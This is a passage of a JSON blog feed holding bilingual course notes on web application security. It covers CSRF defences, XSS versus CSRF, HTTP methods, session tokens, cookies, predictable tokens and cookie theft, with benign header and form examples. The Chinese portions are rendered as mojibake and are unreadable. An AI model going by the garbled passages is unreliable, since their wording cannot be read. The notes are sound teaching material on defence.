å¯†ç®—æ³•å°†ç”¨æˆ·ä¿¡æ¯å’Œæ—¶é—´æˆ³åŠ å¯†ï¼Œç”Ÿæˆå”¯ä¸€çš„ä»¤ç‰Œã€‚</li>\n<li>è¿™ç§ä»¤ç‰Œä¸éœ€è¦æœåŠ¡ç«¯å­˜å‚¨ï¼Œå› ä¸ºå®ƒå¯ä»¥é€šè¿‡è§£å¯†æ¥éªŒè¯è¯·æ±‚çš„æœ‰æ•ˆæ€§ã€‚</li>\n</ul>\n</li>\n<li>hash-based token å“ˆå¸Œä»¤ç‰Œï¼š<ul>\n<li>ä½¿ç”¨ç”¨æˆ·ä¼šè¯ä¿¡æ¯ã€è¯·æ±‚å‚æ•°ç­‰ä½œä¸ºè¾“å…¥ï¼Œç”Ÿæˆä¸€ä¸ªå“ˆå¸Œå€¼ä½œä¸ºä»¤ç‰Œã€‚</li>\n<li>é€šå¸¸é€šè¿‡åŠ ç›ï¼ˆsaltï¼‰æ¥å¢åŠ ä»¤ç‰Œçš„å¤æ‚æ€§å’Œä¸å¯é¢„æµ‹æ€§ã€‚</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>Prevent CSRF: Defence-in-depth techniques</li>\n</ol>\n<ul>\n<li>SameSite Cookie Attribute <ul>\n<li>Prevent the cookie from being sent by the browser to the target site in all cross-site browsing contexts</li>\n<li>å¦‚ä½•é˜²æŠ¤ï¼šè®¾ç½®<code>SameSite</code>å±æ€§ä¸º<code>Strict</code>æˆ–<code>Lax</code>ï¼Œé˜²æ­¢æµè§ˆå™¨åœ¨è·¨ç«™æµè§ˆç¯å¢ƒä¸­å‘é€Cookieï¼Œä»è€Œé˜»æ­¢CSRFæ”»å‡»ã€‚<br><code>SameSite=Strict</code>ï¼šCookieä»…åœ¨åŒä¸€ç«™ç‚¹è¯·æ±‚æ—¶å‘é€ï¼Œå®Œå…¨é˜»æ­¢è·¨ç«™è¯·æ±‚ã€‚<br><code>SameSite=Lax</code>ï¼šCookieå…è®¸åœ¨å°‘æ•°è·¨ç«™è¯·æ±‚ä¸­å‘é€ï¼ˆå¦‚GETè¯·æ±‚æˆ–å¯¼èˆªï¼‰ï¼Œä½†ä¼šé™åˆ¶å¤§å¤šæ•°æƒ…å†µä¸‹çš„è·¨ç«™è¯·æ±‚ </li>\n<li>ç¤ºä¾‹ï¼š<figure class=\"highlight http\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Set-Cookie</span><span class=\"punctuation\">: </span>sessionId=abc123; SameSite=Strict;</span><br></pre></td></tr></table></figure></li>\n</ul>\n</li>\n<li>Verifying Origin With Standard Headers <ul>\n<li>Determine and match both the source and target of a request </li>\n<li>å¦‚ä½•é˜²æŠ¤ï¼šWebåº”ç”¨æœåŠ¡å™¨æ£€æŸ¥è¯·æ±‚çš„Originæˆ–Refererå¤´ï¼Œå¹¶ç¡®ä¿å®ƒä»¬ä¸åº”ç”¨çš„åŸŸåŒ¹é…ã€‚<br>ä»…å…è®¸æ¥è‡ªå¯ä¿¡åŸŸçš„è¯·æ±‚è¿›è¡Œå¤„ç†ã€‚</li>\n<li>ç¤ºä¾‹ï¼šå¯¹äºé“¶è¡Œè½¬è´¦è¯·æ±‚ï¼ŒæœåŠ¡å™¨å°†ç¡®ä¿è¯·æ±‚çš„æ¥æºä¸º<code>https://bank.com</code>ã€‚</li>\n</ul>\n</li>\n<li>Double Submit Cookie <ul>\n<li>Every transaction request must include a random value in both a cookie and as a request parameter </li>\n<li>å¦‚ä½•é˜²æŠ¤ï¼š<br>ç”¨æˆ·åœ¨ç™»å½•æ—¶ç”Ÿæˆä¸€ä¸ªéšæœºå€¼ï¼Œå¹¶åœ¨åç»­çš„æ¯ä¸ªè¯·æ±‚ä¸­å°†è¯¥å€¼åŒæ—¶åŒ…å«åœ¨Cookieå’Œè¯·æ±‚å‚æ•°ä¸­ã€‚<br>æœåŠ¡å™¨æ£€æŸ¥è¿™ä¸¤ä¸ªå€¼æ˜¯å¦åŒ¹é…ï¼Œä¸åŒ¹é…åˆ™æ‹’ç»è¯·æ±‚ã€‚</li>\n<li>ä¼˜åŠ¿ï¼šæ”»å‡»è€…æ— æ³•åŒæ—¶æ§åˆ¶Cookieå’Œè¯·æ±‚å‚æ•°ï¼Œé˜²æ­¢äº†CSRFæ”»å‡»ã€‚</li>\n<li>ç¤ºä¾‹ï¼š<figure class=\"highlight http\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// Set cookie</span><br><span class=\"line\"> Set-Cookie: csrfToken=xyz123;</span><br><span class=\"line\"></span><br><span class=\"line\"> // Form submission includes the token</span><br><span class=\"line\"> POST /transfer</span><br><span class=\"line\"> Cookie: csrfToken=xyz123</span><br><span class=\"line\"> Body: token=xyz123&amp;acct=CHARLIE&amp;amount=1000</span><br></pre></td></tr></table></figure></li>\n</ul>\n</li>\n<li>User Interaction <ul>\n<li>Involve the user in the transaction (e.g. one-time verification code, CAPTCHA, etc.)</li>\n<li>å¦‚ä½•é˜²æŠ¤ï¼šåœ¨é‡è¦æ“ä½œï¼ˆå¦‚è½¬è´¦ã€å¯†ç ä¿®æ”¹ç­‰ï¼‰ä¸­ä½¿ç”¨ä¸€æ¬¡æ€§éªŒè¯ç ï¼ˆOTPï¼‰ã€CAPTCHAæˆ–ç±»ä¼¼æœºåˆ¶ï¼Œè¦æ±‚ç”¨æˆ·ä¸»åŠ¨ç¡®è®¤æ“ä½œã€‚<br>é€šè¿‡ç”¨æˆ·çš„ä¸»åŠ¨å‚ä¸ï¼Œç¡®ä¿è¯·æ±‚æ˜¯ç”±ç”¨æˆ·å‘èµ·çš„ï¼Œè€Œä¸æ˜¯ç”±æ¶æ„è„šæœ¬ä¼ªé€ çš„ã€‚</li>\n<li>ä¼˜åŠ¿ï¼šé˜»æ­¢è‡ªåŠ¨åŒ–CSRFæ”»å‡»ï¼Œæé«˜äº†ç”¨æˆ·æ“ä½œçš„å®‰å…¨æ€§ã€‚</li>\n<li>ç¤ºä¾‹ï¼šåœ¨è½¬è´¦é¡µé¢ä¸­è¦æ±‚ç”¨æˆ·è¾“å…¥å‘é€åˆ°å…¶æ‰‹æœºçš„ä¸€æ¬¡æ€§éªŒè¯ç ï¼ˆOTPï¼‰ã€‚</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"XSS VS CSRF\" class=\"active\"><a class=\"anchor\"  href=\"#XSS VS CSRF\">#</a>XSS VS CSRF</h1>\n\n<table>\n<thead>\n<tr>\n<th>æ–¹é¢</th>\n<th>XSS (Cross-Site Scripting)</th>\n<th>CSRF (Cross-Site Request Forgery)</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>æ”»å‡»ç›®æ ‡</td>\n<td>æ‰§è¡Œæ¶æ„ä»£ç ï¼Œæ§åˆ¶ç”¨æˆ·æµè§ˆå™¨</td>\n<td>åˆ©ç”¨ç”¨æˆ·çš„èº«ä»½è®¤è¯ï¼Œè¿›è¡Œæœªæˆæƒè¯·æ±‚</td>\n</tr>\n<tr>\n<td>å±å®³</td>\n<td>çªƒå–æ•æ„Ÿä¿¡æ¯ã€åŠ«æŒä¼šè¯ã€æ“çºµç½‘é¡µå†…å®¹</td>\n<td>æœªæˆæƒæ›´æ”¹æ•°æ®ã€æäº¤è¡¨å•ç­‰æ•æ„Ÿæ“ä½œ</td>\n</tr>\n<tr>\n<td>åŸç†</td>\n<td>æ³¨å…¥æ¶æ„ä»£ç ï¼Œä½¿æµè§ˆå™¨æ‰§è¡Œæ”»å‡»è€…çš„è„šæœ¬</td>\n<td>åˆ©ç”¨ç”¨æˆ·çš„å·²ç™»å½•çŠ¶æ€ï¼Œå‘é€ä¼ªé€ çš„è¯·æ±‚</td>\n</tr>\n<tr>\n<td>é˜²å¾¡æªæ–½</td>\n<td>è¾“å…¥è¿‡æ»¤ã€å†…å®¹å®‰å…¨ç­–ç•¥ (CSP)ã€HttpOnly Cookie</td>\n<td>CSRF ä»¤ç‰Œã€æ£€æŸ¥ Referer Headerã€SameSite Cookie</td>\n</tr>\n</tbody></table>\n",
            "tags": [
                "software security",
                "HTTP",
                "XSS",
                "CSRF"
            ]
        },
        {
            "id": "http://example.com/course/Web-Application-Security/",
            "url": "http://example.com/course/Web-Application-Security/",
            "title": "Web Application Security",
            "date_published": "2024-10-30T11:17:47.000Z",
            "content_html": "<h1 id=\"Overall\" class=\"active\"><a class=\"anchor\"  href=\"#Overall\">#</a>Overall</h1>\n\n<ol>\n<li>Web Application Stack<br><img data-src=\"https://img.picui.cn/free/2024/10/30/672216036891d.png\" alt=\"img\"></li>\n<li>OSI Network Protocol Stack<br>More in Network System<br><img data-src=\"https://img.picui.cn/free/2024/10/30/6722160374233.png\" alt=\"img\"></li>\n<li>Web Applications<br>Security problem is usually to do with dynamic creation of web contents<br><img data-src=\"https://img.picui.cn/free/2024/10/30/672216b529859.png\" alt=\"img\"></li>\n</ol>\n<h1 id=\"HTTP\" class=\"active\"><a class=\"anchor\"  href=\"#HTTP\">#</a>HTTP</h1>\n\n<h2 id=\"HTTP\" class=\"active\"><a class=\"anchor\"  href=\"#HTTP\">#</a>HTTP</h2>\n\n<ol>\n<li>HyperText Transport Protocol (HTTP)<br>HTTP is a request&#x2F;response protocol for communicating between web clients and web servers.<br>A web client sends a request to a particular web server for a particular resource (identified by a URL) and the web server responds with some kind of data (often HTML data)</li>\n<li>HTTP Request Messag</li>\n</ol>\n<ul>\n<li>Send TCP&#x2F;IP message to <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5leGFtcGxlLmNvbS8=\">www.example.com</span> on port 80 containing the following:<br><img data-src=\"https://img.picui.cn/free/2024/10/30/672217d602618.png\" alt=\"img\"></li>\n</ul>\n<ol start=\"3\">\n<li><p>HTTP Request Methods</p>\n<table>\n<thead>\n<tr>\n<th>Method</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>GET</td>\n<td>Retrieve information</td>\n</tr>\n<tr>\n<td>POST</td>\n<td>Request some operation be performed</td>\n</tr>\n<tr>\n<td>PUT</td>\n<td>Provide new information</td>\n</tr>\n<tr>\n<td>DELETE</td>\n<td>Request something be removed from server</td>\n</tr>\n<tr>\n<td>HEAD</td>\n<td>Same as GET except that only header info is returned</td>\n</tr>\n<tr>\n<td>OPTIONS</td>\n<td>Request information about communication options available</td>\n</tr>\n<tr>\n<td>TRACE</td>\n<td>Used for testing and diagnosing problems</td>\n</tr>\n<tr>\n<td>CONNECT</td>\n<td>Used for tunnelling using proxies</td>\n</tr>\n</tbody></table>\n</li>\n<li><p>HTTP Response Message<br><img data-src=\"https://img.picui.cn/free/2024/10/30/672217d60533f.png\" alt=\"img\"></p>\n</li>\n<li><p>HTTP is a Stateless Protocol<br>HTTP is said to be a stateless protocol because each request is handled independently<br>Assumes no memory of requests that came before current request<br>If a web server receives a number of HTTP requests from the same client, they are each handled by the server in exactly the same way as they would, had they been sent from different clients.</p>\n</li>\n<li><p>HTML Forms: the GET Method<br>The GET method sends encoded data appended to the URL string</p>\n</li>\n</ol>\n<ul>\n<li>The data is separated from the URL by a â€˜?â€™ </li>\n<li>The encoded data and any path information are placed in the CGI environment variables <code>QUERY_STRING</code> and <code>PATH_INFO</code></li>\n</ul>\n<ol start=\"7\">\n<li>HTML Forms: the Post Method<br>The POST method sends encoded data in the body section of the request</li>\n</ol>\n<ul>\n<li>Data in the body is encoded in the same way as in the GET method<table>\n<thead>\n<tr>\n<th>Feature</th>\n<th>GET</th>\n<th>POST</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>ç”¨é€”</td>\n<td>é€šå¸¸ç”¨äºä¿¡æ¯æ£€ç´¢ï¼Œä¸ä¼šæ”¹å˜æœåŠ¡å™¨çŠ¶æ€</td>\n<td>æäº¤æ•°æ®è¿›è¡Œå¤„ç†ï¼Œå¯èƒ½æ›´æ–°æœåŠ¡å™¨æˆ–æ•°æ®åº“çŠ¶æ€</td>\n</tr>\n<tr>\n<td>å¯è§æ€§</td>\n<td>å‚æ•°åœ¨ URL ä¸­å¯è§ï¼Œæ˜“äºè°ƒè¯•</td>\n<td>å‚æ•°éšè—åœ¨è¯·æ±‚ä¸»ä½“ä¸­</td>\n</tr>\n<tr>\n<td>å®‰å…¨æ€§</td>\n<td>ä¸é€‚åˆæäº¤å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯</td>\n<td>ä¸æä¾›å®‰å…¨çš„éšç§ä¿æŠ¤</td>\n</tr>\n<tr>\n<td>é•¿åº¦é™åˆ¶</td>\n<td>å— URL æœ€å¤§å­—ç¬¦é•¿åº¦é™åˆ¶</td>\n<td>å—æœåŠ¡å™¨å¯æ¥å—çš„æ•°æ®é‡é™åˆ¶</td>\n</tr>\n<tr>\n<td>ç¼“å­˜æ€§</td>\n<td>å¯ä»¥è¢«ç¼“å­˜</td>\n<td>å¿…é¡»é‡æ–°ä¼ è¾“æ•°æ®ï¼Œä¸”ä¸ä¼šè‡ªåŠ¨ç¼“å­˜</td>\n</tr>\n</tbody></table>\n</li>\n</ul>\n<h2 id=\"HTTP Sessions\" class=\"active\"><a class=\"anchor\"  href=\"#HTTP Sessions\">#</a>HTTP Sessions</h2>\n\n<ol>\n<li>HTTP Sessions<br>A sequence of requests and responses from one browser to one (or more) sites</li>\n</ol>\n<ul>\n<li>Session can be long or short <ul>\n<li>Google advertising tracking: 1+ years </li>\n<li>Google Mail login: 2 weeks</li>\n</ul>\n</li>\n<li>Authorise user once, and all subsequent requests are tied to user <ul>\n<li>Without session management, users would have to constantly reauthenticate</li>\n</ul>\n</li>\n<li>Web application environments (ASP, PHP, etc.) provide session tokens</li>\n</ul>\n<ol start=\"2\">\n<li><p>Session Tokens<br>Identifying the specific session instance<br><img data-src=\"https://img.picui.cn/free/2024/10/30/67221c58289ab.png\" alt=\"img\"></p>\n<ol>\n<li>Session Tokens in URLs<br>The session token is part of the URL and will be sent to the web server through HTTP GET requests</li>\n</ol>\n<ul>\n<li>E.g. <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5leGFtcGxlLmNvbS9idXkuYXNwP2FydGljbGU9Mjc3ODE7c2Vzc2lvbmlkPUlFNTU3OTkwMTU3OA==\">http://www.example.com/buy.asp?article=27781;sessionid=IE5579901578</span> </li>\n<li>This mechanism works even in case of client security restrictions (e.g., no cookies are allowed)<br>Problems: </li>\n<li>All information contained in the URL might be stored in firewall or proxy log files <ul>\n<li>Could simply be printed out with the web page on a shared printer</li>\n</ul>\n</li>\n<li>The URL, including sensitive data, can be sent in the HTTP referrer field to other web servers </li>\n<li>Imply a high risk of sensitive session data being disclosed to unauthorised third parties</li>\n</ul>\n<ol start=\"2\">\n<li>HTML Forms with Hidden Fields<br>Session token and information can be included in hidden fields in a form<br>Works even in case of user client security restrictions, e.g., no cookies or JavaScript<br>Does not provide protection mechanisms such as session expiration<br>Cannot last beyond a single interactive session<figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">FORM</span> <span class=\"attr\">METHOD</span>=<span class=\"string\">&quot;POST&quot;</span> <span class=\"attr\">ACTION</span>=<span class=\"string\">&quot;/cgi-bin/order_goods.pl&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">INPUT</span> <span class=\"attr\">TYPE</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">NAME</span>=<span class=\"string\">&quot;customerid&quot;</span> <span class=\"attr\">VALUE</span>=<span class=\"string\">&quot;0815&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">INPUT</span> <span class=\"attr\">TYPE</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">NAME</span>=<span class=\"string\">&quot;valid_order&quot;</span> <span class=\"attr\">VALUE</span>=<span class=\"string\">&quot;yes&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">INPUT</span> <span class=\"attr\">TYPE</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">NAME</span>=<span class=\"string\">&quot;productid&quot;</span> <span class=\"attr\">VALUE</span>=<span class=\"string\">&quot;4711&quot;</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;/<span class=\"name\">FORM</span>&gt;</span></span><br></pre></td></tr></table></figure></li>\n<li>HTTP Cookies<br>Can be set either using HTTP headers or JavaScript<br>An extra response header is added as follows to save information to the client <figure class=\"highlight http\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Set-Cookie</span><span class=\"punctuation\">: </span>id=321328765; domain=.qut.edu.au; path=/cgi-bin</span><br></pre></td></tr></table></figure>\nWhen a user sends an HTTP request for a URL for which the client machine<br>holds a cookie, an extra HTTP header is added to the client request every time<figure class=\"highlight http\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie:id=321328765</span><br></pre></td></tr></table></figure>\nOther attributes: Expires, Domain, HttpOnly, Path, Port, Secure<br><img data-src=\"https://img.picui.cn/free/2024/10/30/672221a731746.png\" alt=\"img\"></li>\n</ol>\n</li>\n<li><p>Session tokens Risk</p>\n<ol>\n<li>Predictable Tokens</li>\n</ol>\n<ul>\n<li>Counter (Verizon Wireless) </li>\n<li>Weak MAC (WSJ) <ul>\n<li>token &#x3D; {userid,  MAC_k(userid) }</li>\n</ul>\n</li>\n<li>Apache Tomcat <ul>\n<li><code>generateSessionID()</code> uses MD5 but with a weak pseudorandom number generator <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbS9lbi11cy9yZXNlYXJjaC93cC1jb250ZW50L3VwbG9hZHMvMjAxNi8wMi9nbTA1LnBkZg==\">CT-RSA 2005</span></li>\n</ul>\n</li>\n<li>PHP <ul>\n<li><code>create_session_id</code> uses weak pseudorandom number generator <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWNsaXN0cy5vcmcvZnVsbGRpc2Nsb3N1cmUvMjAxMC9NYXIvNTE5\">seclists.org</span></li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Cookie Theft<br>ä¸€äº›ç½‘ç«™ä»…åŠ å¯†ç™»å½•è¿‡ç¨‹ï¼Œè€Œä¸åŠ å¯†ä¼šè¯ Cookieï¼Œä»è€Œå¯¼è‡´ä¼šè¯ä»¤ç‰Œå®¹æ˜“è¢«æˆªè·<br>Example 1: login over HTTPS, but subsequently use HTTP</li>\n</ol>\n<ul>\n<li>åœ¨ä¸å®‰å…¨çš„ç½‘ç»œç¯å¢ƒï¼ˆå¦‚æ— çº¿å’–å•¡é¦†ï¼‰ä¸­ï¼ŒCookie å¯èƒ½è¢«çªƒå–ã€‚</li>\n<li>Other reasons why session token sent in the clear <ul>\n<li>HTTPS&#x2F;HTTP mixed content pages at site </li>\n<li>Man-in-the-middle attacks on SSL </li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlYnV0bGVyLmNvbS8yMDEwLzEwLzI0L2ZpcmVzaGVlcC8=\">Firesheep</span> Firefox extension performs this attack</li>\n</ul>\n</li>\n</ul>\n<p>Example 2: Cross-Site Scripting (XSS) attacks</p>\n</li>\n</ol>\n",
            "tags": [
                "software security",
                "HTTP",
                "OSI"
            ]
        }
    ]
}